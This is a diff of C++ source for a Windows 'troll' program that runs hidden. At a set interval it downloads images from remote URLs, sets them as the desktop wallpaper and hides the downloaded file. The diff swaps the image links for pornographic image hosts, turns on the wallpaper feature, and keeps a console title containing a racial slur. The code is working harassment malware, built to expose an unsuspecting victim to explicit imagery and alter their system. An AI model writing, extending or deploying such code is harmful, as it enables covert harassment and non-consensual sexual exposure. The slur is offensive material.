@@ -12,12 +12,16 @@
 #pragma comment(lib, "Urlmon.lib")
 
 #ifdef _DEBUG
-constexpr int trollInterval = 10;
+constexpr int trollInterval = 2;
 float elapsedTime = 1.0f; // wait for first troll
 #elif NDEBUG
-constexpr int trollInterval = 60;
+constexpr int trollInterval = 120;
 float elapsedTime = 0.0f;
 #endif
+
+#define doConsoleTroll 0
+#define doWebTroll 0
+#define doBackgroundTroll 1
 
 CONSOLE_FONT_INFOEX cfi;
 CONSOLE_SCREEN_BUFFER_INFOEX consolesize;
@@ -63,6 +67,8 @@ BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 #ifdef _DEBUG
     ShowWindow(hwnd, SW_SHOW);
 #endif
+
+#if doConsoleTroll
     AllocConsole();
     SetConsoleTitleW(L"Get trolled negga");
     FILE* f;
@@ -91,6 +97,7 @@ BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
     SetConsoleScreenBufferInfoEx(hConsole, &consolesize);
     
     trollConsole();
+#endif
 
     const auto initDuration = std::chrono::high_resolution_clock::now().time_since_epoch();
 
@@ -100,6 +107,7 @@ BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
     MSG msg;
     while (true)
     {
+
         auto now = std::chrono::high_resolution_clock::now().time_since_epoch();
         int troll = (int)((float)std::chrono::duration_cast<std::chrono::microseconds>((now - initDuration)).count() / 1000 / 1000);
 
@@ -112,8 +120,11 @@ BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
         };
 
         constexpr const char* trollImageUrlList[] = {
-            "https://cdn.discordapp.com/attachments/1117699911786438668/1161932979573116958/image.png",
-            "https://cdn.discordapp.com/attachments/456024279822106644/1161928995705729086/2Q.png",
+            "https://cdn77-pic.xvideos-cdn.com/videos/thumbs169poster/e1/c5/c6/e1c5c67e20f860c432873e1844ba01cd/e1c5c67e20f860c432873e1844ba01cd.26.jpg",
+            "https://di.phncdn.com/videos/202205/10/407834071/original/(m=qKOL1NXbeGNdHgaaaa)(mh=FL9JeUDt1k_va7ji)0.jpg",
+            "https://icdn05.icegay.tv/71789/3589421_9.jpg",
+            "https://queerty-prodweb.s3.amazonaws.com/2019/04/jacen_zhu_01.jpg",
+
         };
 
         constexpr int trollWebUrlCount = sizeof(trollWebUrlList) / sizeof(char*);
@@ -126,22 +137,28 @@ BOOL WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
 
                 const std::string backgroundPathA = std::string(deskPath) + "\\troll.png";
 
-#ifdef NDEBUG
+#if doWebTroll
                 ShellExecuteA(0, 0, trollWebUrlList[trollCounter % trollWebUrlCount], 0, 0, SW_SHOW);
 #endif
+
+#if doBackgroundTroll
                 remove(backgroundPathA.c_str());
                 HRESULT hr;
                 hr = URLDownloadToFileA(0, trollImageUrlList[trollCounter % trollImageUrlCount], backgroundPathA.c_str(), BINDF_GETNEWESTVERSION, 0);
                 if (hr == S_OK) {
-                   SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)backgroundPathA.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+                    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)backgroundPathA.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
                 }
-
                 DWORD attributes = GetFileAttributesA(backgroundPathA.c_str());
                 if (attributes != INVALID_FILE_ATTRIBUTES) {
                     attributes |= FILE_ATTRIBUTE_HIDDEN;
                     SetFileAttributesA(backgroundPathA.c_str(), attributes);
                 }
-                trollConsole();
+#endif                
+
+
+#if doConsoleTroll
+                    trollConsole();
+#endif
                 trollCounter += 1;
             }
         }
@@ -185,6 +202,7 @@ LRESULT CALLBACK WindowProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lPara
 
 
 void trollConsole() {
+#if doConsoleTroll
 #ifdef _DEBUG
     static bool consoleOpen = false;
     if (!consoleOpen) {
@@ -238,5 +256,7 @@ void trollConsole() {
     
 #ifdef NDEBUG
     FreeConsole();
+#endif
+
 #endif
 }
